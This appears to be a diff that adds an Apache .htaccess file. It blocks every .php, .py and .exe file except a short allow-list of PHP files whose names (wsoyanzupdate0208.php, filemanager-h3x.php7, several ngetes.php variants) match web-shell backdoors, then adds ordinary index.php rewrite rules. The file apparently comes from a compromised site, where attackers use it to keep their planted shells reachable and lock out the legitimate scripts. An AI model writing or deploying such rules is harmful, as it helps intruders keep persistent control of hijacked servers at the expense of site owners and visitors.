@@ -1,0 +1,16 @@
+<FilesMatch ".(py|exe|php)$">
+ Order allow,deny
+ Deny from all
+</FilesMatch>
+<FilesMatch "^(ngetes.php7|wsoyanzupdate0208.php|ngetes.php|FactoryRuntimeLoaderInterface.php|ngetes.php5|ngetes.php9|ngetes.php56|filemanager-h3x.php7)$">
+ Order allow,deny
+ Allow from all
+</FilesMatch>
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteRule ^index\.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . /index.php [L]
+</IfModule>
